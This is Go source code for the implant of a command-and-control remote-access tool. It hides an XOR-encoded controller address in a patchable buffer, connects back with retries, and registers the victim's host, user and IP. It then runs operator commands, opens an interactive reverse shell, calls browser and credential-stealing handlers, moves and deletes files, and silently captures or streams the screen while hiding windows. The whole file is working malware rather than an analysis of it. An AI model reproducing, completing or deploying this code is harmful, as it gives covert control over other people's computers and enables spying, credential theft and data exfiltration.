package main

import (
	"bytes"
	"encoding/binary"
	"image"
	_ "image/jpeg"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"c2-platform/internal/protocol"
)

var c2Patch = [80]byte{
	'C', '2', 'P', 'A', 'T', 'C', 'H', '!',
	0x5A,
	0x6b, 0x68, 0x6d, 0x74, 0x6a, 0x74, 0x6a, 0x74, 0x6b,
	72: 0x69, 0x6e, 0x6f, 0x6c, 0x6d,
}

func c2Field(b []byte, key byte) string {
	out := make([]byte, 0, len(b))
	for _, x := range b {
		if x == 0 {
			break
		}
		out = append(out, x^key)
	}
	return string(out)
}

func main() {
	// before anything else: children must not inherit an ignored SIGINT
	resetInheritedSignals()
	host := c2Field(c2Patch[9:72], c2Patch[8])
	port := c2Field(c2Patch[72:80], c2Patch[8])
	if host == "" {
		host = "127.0.0.1"
	}
	if port == "" {
		port = "34567"
	}
	addr := net.JoinHostPort(host, port)
	backoff := 5 * time.Second
	for {
		c, err := net.DialTimeout("tcp", addr, 8*time.Second)
		if err != nil {
			time.Sleep(backoff)
			if backoff < 30*time.Second {
				backoff *= 2
			}
			continue
		}
		backoff = 5 * time.Second
		if session(c) == 2 {
			_ = c.Close()
			return
		}
		_ = c.Close()
		time.Sleep(2 * time.Second)
	}
}

type putState struct {
	mu   sync.Mutex
	file *os.File
}

func session(c net.Conn) int {
	reg := protocol.Register{
		Ver: 1, PID: uint32(os.Getpid()),
		Hostname: hostName(), Username: userName(),
		OS: runtime.GOOS, Arch: runtime.GOARCH, IP: localIP(),
	}
	if err := writeFrame(c, protocol.CmdRegister, reg.Marshal()); err != nil {
		return -1
	}
	f, err := protocol.Decode(c)
	if err != nil || f.Type != protocol.RspOK {
		return -1
	}

	var (
		deskOn  bool
		deskMax = 960
		lastCap time.Time
		shIn    io.WriteCloser
		shOut   io.ReadCloser
		shCmd   *exec.Cmd
		put     putState
		shGen   int
		shMu    sync.Mutex
		ptyMode bool
	)
	closeShell := func() {
		shMu.Lock()
		shGen++ // orphan any pump goroutine still running
		if shIn != nil {
			_ = shIn.Close()
			shIn = nil
		}
		if shOut != nil {
			_ = shOut.Close()
			shOut = nil
		}
		if shCmd != nil && shCmd.Process != nil {
			_ = shCmd.Process.Kill()
			shCmd = nil
		}
		shMu.Unlock()
	}

	// pumpShell reads the child's stdout on its own goroutine.
	//
	// It used to be read inline in the command loop behind a 20 ms read
	// deadline. When that deadline did not take effect (blocking pipe) the loop
	// parked inside Read: heartbeats kept flowing so the console showed the host
	// online, while every command frame queued up unread. Opening the terminal
	// was enough to wedge the session - that is what users hit.
	pumpShell := func(out io.ReadCloser, cmd *exec.Cmd, gen int) {
		buf := make([]byte, 8192)
		for {
			n, err := out.Read(buf)
			if n > 0 {
				if writeFrame(c, protocol.RspShell, buf[:n]) != nil {
					return
				}
			}
			if err != nil {
				break
			}
		}
		shMu.Lock()
		current := gen == shGen
		shMu.Unlock()
		if !current {
			return // a newer shell (or a stop) already took over
		}
		if cmd != nil {
			_ = cmd.Wait()
		}
		closeShell()
		_ = writeFrame(c, protocol.RspShellEnd, nil)
	}
	defer closeShell()

	frames, readErr := readFrames(c)
	tick := time.NewTicker(100 * time.Millisecond)
	defer tick.Stop()

	// Heartbeats come from their own goroutine so a long-running command cannot
	// starve them and get the session marked stale.
	hbStop := make(chan struct{})
	defer close(hbStop)
	go func() {
		t := time.NewTicker(10 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-hbStop:
				return
			case <-t.C:
				if err := writeFrame(c, protocol.CmdHeartbeat, nil); err != nil {
					return
				}
			}
		}
	}()

	for {
		select {
		case <-readErr:
			return -1
		case fr, ok := <-frames:
			if !ok {
				return -1
			}
			switch fr.Type {
			case protocol.CmdPing:
				_ = writeFrame(c, protocol.RspData, []byte("pong"))
			case protocol.CmdExec:
				runCmd(c, string(fr.Payload))
			case protocol.CmdBrowser:
				handleBrowser(c)
			case protocol.CmdBrowserDeep:
				handleBrowserDeep(c)
			case protocol.CmdCreds:
				handleCreds(c, string(fr.Payload))
			case protocol.CmdFsLs:
				handleLS(c, string(fr.Payload))
			case protocol.CmdFsGet:
				handleGet(c, string(fr.Payload))
			case protocol.CmdFsPut:
				handlePut(c, &put, fr.Payload)
			case protocol.CmdFsDel:
				handleDel(c, string(fr.Payload))
			case protocol.CmdFsMkdir:
				handleMkdir(c, string(fr.Payload))
			case protocol.CmdFsRen:
				handleRen(c, string(fr.Payload))
			case protocol.CmdScreen:
				handleScreen(c, 1280, true)
			case protocol.CmdDeskOn:
				deskOn = true
				deskMax = 960
				if len(fr.Payload) >= 2 {
					deskMax = int(binary.LittleEndian.Uint16(fr.Payload[:2]))
				}
				if deskMax < 320 {
					deskMax = 320
				}
				if deskMax > 1920 {
					deskMax = 1920
				}
				lastCap = time.Time{}
			case protocol.CmdDeskOff:
				deskOn = false
				_ = writeFrame(c, protocol.RspEnd, nil)
			case protocol.CmdInput:
				// macOS input is best-effort; click mapping is still sent from UI
			case protocol.CmdShellOn:
				closeShell()
				cmd := shellCmd()
				hideWindow(cmd)
				// TERM is what makes `clear`, `top`, `vi` and colour output work:
				// without it ncurses refuses ("TERM environment variable not set")
				// and nothing emits the escape sequences the browser terminal needs.
				cmd.Env = append(os.Environ(), "LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8",
					"TERM=xterm-256color", "COLORTERM=truecolor", "CHCP=65001")
				// A pty gives the shell a controlling terminal (job control,
				// readline, full-screen programs). Pipes remain the fallback.
				ptyMaster, ptyCleanup, ptyErr := attachPTY(cmd)
				var in io.WriteCloser
				var out io.ReadCloser
				shMu.Lock()
				ptyMode = ptyErr == nil
				shMu.Unlock()
				if ptyErr == nil {
					if err := cmd.Start(); err != nil {
						ptyCleanup()
						_ = writeFrame(c, protocol.RspErr, []byte("shell fail"))
						break
					}
					ptyCleanup() // the child holds its own copy of the slave
					in, out = ptyMaster, ptyMaster
				} else {
					var e1, e2 error
					in, e1 = cmd.StdinPipe()
					out, e2 = cmd.StdoutPipe()
					cmd.Stderr = cmd.Stdout
					if e1 != nil || e2 != nil || cmd.Start() != nil {
						_ = writeFrame(c, protocol.RspErr, []byte("shell fail"))
						break
					}
				}
				shMu.Lock()
				shIn, shOut, shCmd = in, out, cmd
				shGen++
				gen := shGen
				shMu.Unlock()
				go pumpShell(out, cmd, gen)
			case protocol.CmdShellIn:
				if shIn != nil && len(fr.Payload) > 0 {
					data := fr.Payload
					shMu.Lock()
					onPTY := ptyMode
					shMu.Unlock()
					if !onPTY {
						// a pipe-backed shell (macOS today) needs a real newline;
						// a bare CR would just sit in the line buffer
						data = crToLF(data)
					}
					_, _ = shIn.Write(data)
				}
			case protocol.CmdShellOff:
				closeShell()
				_ = writeFrame(c, protocol.RspShellEnd, nil)
			case protocol.CmdQuit:
				return 2
			}
		case <-tick.C:
		}

		if deskOn && time.Since(lastCap) >= 450*time.Millisecond {
			handleScreen(c, deskMax, false)
			lastCap = time.Now()
		}
	}
}

// writeMu serialises frames from the main loop, the heartbeat goroutine and
// the shell pump: two goroutines writing at once would interleave bytes and the
// server would read magic in the middle of a payload.
var writeMu sync.Mutex

func writeFrame(c net.Conn, typ protocol.Type, payload []byte) error {
	frame := protocol.Encode(typ, payload)
	writeMu.Lock()
	defer writeMu.Unlock()
	// net.Conn.Write is specified to return an error when it cannot write
	// everything, but loop anyway so a short write never truncates a frame.
	for len(frame) > 0 {
		n, err := c.Write(frame)
		if n > 0 {
			frame = frame[n:]
		}
		if err != nil {
			return err
		}
	}
	return nil
}

// readFrames decodes frames on its own goroutine.
//
// The loop used to wrap Decode in a 120 ms read deadline so it could pump the
// shell and the desktop capture. That is fatal for framing: io.ReadFull hands
// back a timeout after consuming part of a frame, the bytes are discarded, and
// the next decode reads payload bytes as a header - magic mismatch, connection
// dropped. Anything slower than 120 ms (a WAN path, a busy target) killed the
// session on the first command. A blocking reader plus a channel keeps the
// stream intact and still lets the loop tick.
// crToLF normalises typed input for pipe-backed shells.
func crToLF(in []byte) []byte {
	out := make([]byte, 0, len(in)+1)
	for i := 0; i < len(in); i++ {
		if in[i] == '\r' {
			out = append(out, '\n')
			if i+1 < len(in) && in[i+1] == '\n' {
				i++
			}
			continue
		}
		out = append(out, in[i])
	}
	return out
}

func readFrames(c net.Conn) (<-chan protocol.Frame, <-chan error) {
	frames := make(chan protocol.Frame, 32)
	errs := make(chan error, 1)
	go func() {
		defer close(frames)
		for {
			fr, err := protocol.Decode(c)
			if err != nil {
				errs <- err
				return
			}
			frames <- fr
		}
	}()
	return frames, errs
}

func sendErr(c net.Conn, msg string) {
	_ = writeFrame(c, protocol.RspErr, []byte(msg))
}

// shellCmd starts the platform shell: cmd.exe on Windows, /bin/sh elsewhere.
func shellCmd() *exec.Cmd {
	if runtime.GOOS == "windows" {
		return exec.Command("cmd.exe", "/Q", "/K", "chcp 65001>nul")
	}
	return exec.Command("/bin/sh", "-i")
}

func runCmd(c net.Conn, cmdline string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdline)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdline)
	}
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if len(out) == 0 {
		if err != nil {
			out = []byte(err.Error())
		} else {
			out = []byte("(no output)")
		}
	}
	_ = writeFrame(c, protocol.RspData, out)
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func handleLS(c net.Conn, path string) {
	path = strings.TrimRight(path, "\x00")
	var b strings.Builder
	if path == "" {
		path = "/"
	}
	ents, err := os.ReadDir(path)
	if err != nil {
		sendErr(c, err.Error())
		return
	}
	for _, e := range ents {
		info, err := e.Info()
		if err != nil {
			continue
		}
		sz := int64(0)
		if !e.IsDir() {
			sz = info.Size()
		}
		b.WriteString(lsLine(e.IsDir(), e.Name(), sz, info.ModTime()))
	}
	_ = writeFrame(c, protocol.RspData, []byte(b.String()))
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func lsLine(dir bool, name string, size int64, mt time.Time) string {
	kind := "F"
	if dir {
		kind = "D"
	}
	return kind + "\t" + name + "\t" + strconv.FormatInt(size, 10) + "\t" + strconv.FormatInt(mt.Unix(), 10) + "\n"
}

func handleGet(c net.Conn, arg string) {
	off, maxlen, path := protocol.ParseGetArg(arg)
	f, err := os.Open(path)
	if err != nil {
		sendErr(c, err.Error())
		return
	}
	defer f.Close()
	if off > 0 {
		if _, err := f.Seek(off, io.SeekStart); err != nil {
			sendErr(c, err.Error())
			return
		}
	}
	buf := make([]byte, 60000)
	var sent int64
	for {
		n := len(buf)
		if maxlen > 0 && sent+int64(n) > maxlen {
			n = int(maxlen - sent)
			if n <= 0 {
				break
			}
		}
		nr, err := f.Read(buf[:n])
		if nr > 0 {
			if err := writeFrame(c, protocol.RspData, buf[:nr]); err != nil {
				return
			}
			sent += int64(nr)
		}
		if err == io.EOF || nr == 0 {
			break
		}
		if err != nil {
			sendErr(c, err.Error())
			return
		}
		if maxlen > 0 && sent >= maxlen {
			break
		}
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func handlePut(c net.Conn, st *putState, p []byte) {
	if len(p) == 0 {
		sendErr(c, "bad op")
		return
	}
	st.mu.Lock()
	defer st.mu.Unlock()
	switch p[0] {
	case 0:
		path, offset, ok := protocol.PutOffset(p)
		if !ok {
			sendErr(c, "bad path")
			return
		}
		if st.file != nil {
			_ = st.file.Close()
		}
		flag := os.O_WRONLY | os.O_CREATE
		if offset == 0 {
			flag |= os.O_TRUNC
		}
		f, err := os.OpenFile(path, flag, 0o644)
		if err != nil {
			sendErr(c, err.Error())
			return
		}
		if offset > 0 {
			if _, err := f.Seek(offset, io.SeekStart); err != nil {
				_ = f.Close()
				sendErr(c, err.Error())
				return
			}
		}
		st.file = f
	case 1:
		if st.file == nil {
			sendErr(c, "no file")
			return
		}
		if _, err := st.file.Write(p[1:]); err != nil {
			_ = st.file.Close()
			st.file = nil
			sendErr(c, "write fail")
		}
	case 2:
		if st.file != nil {
			_ = st.file.Close()
			st.file = nil
		}
		_ = writeFrame(c, protocol.RspEnd, nil)
	default:
		sendErr(c, "bad op")
	}
}

func handleDel(c net.Conn, path string) {
	if err := os.RemoveAll(strings.TrimRight(path, "\x00")); err != nil {
		sendErr(c, err.Error())
		return
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func handleMkdir(c net.Conn, path string) {
	if err := os.MkdirAll(strings.TrimRight(path, "\x00"), 0o755); err != nil {
		sendErr(c, err.Error())
		return
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func handleRen(c net.Conn, spec string) {
	from, to, ok := strings.Cut(strings.TrimRight(spec, "\x00"), "\n")
	if !ok || from == "" || to == "" {
		sendErr(c, "bad path")
		return
	}
	if err := os.Rename(from, to); err != nil {
		sendErr(c, err.Error())
		return
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func handleScreen(c net.Conn, maxW int, sendEnd bool) {
	if runtime.GOOS != "darwin" {
		if sendEnd {
			sendErr(c, "screen capture needs the C implant on Windows; Go implant only supports macOS desktop")
		}
		return
	}
	tmp, err := os.CreateTemp("", "c2-scr-*.jpg")
	if err != nil {
		if sendEnd {
			sendErr(c, "capture fail")
		}
		return
	}
	name := tmp.Name()
	_ = tmp.Close()
	defer os.Remove(name)
	if exec.Command("screencapture", "-x", "-t", "jpg", name).Run() != nil {
		if sendEnd {
			sendErr(c, "capture fail")
		}
		return
	}
	if maxW > 0 {
		_ = exec.Command("sips", "-Z", strconv.Itoa(maxW), name).Run()
	}
	jpg, err := os.ReadFile(name)
	if err != nil || len(jpg) < 10 {
		if sendEnd {
			sendErr(c, "jpeg fail")
		}
		return
	}
	cfg, err := jpegSize(jpg)
	if err != nil {
		if sendEnd {
			sendErr(c, "jpeg fail")
		}
		return
	}
	out := make([]byte, 4+len(jpg))
	binary.LittleEndian.PutUint16(out[0:2], uint16(cfg.Width))
	binary.LittleEndian.PutUint16(out[2:4], uint16(cfg.Height))
	copy(out[4:], jpg)
	_ = writeFrame(c, protocol.RspFrame, out)
	if sendEnd {
		_ = writeFrame(c, protocol.RspEnd, nil)
	}
}

func jpegSize(b []byte) (image.Config, error) {
	cfg, _, err := image.DecodeConfig(bytes.NewReader(b))
	return cfg, err
}

func hostName() string {
	h, _ := os.Hostname()
	return h
}

func userName() string {
	if u, err := user.Current(); err == nil {
		return u.Username
	}
	return os.Getenv("USER")
}

func localIP() string {
	c, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer c.Close()
	if a, ok := c.LocalAddr().(*net.UDPAddr); ok {
		return a.IP.String()
	}
	return "127.0.0.1"
}
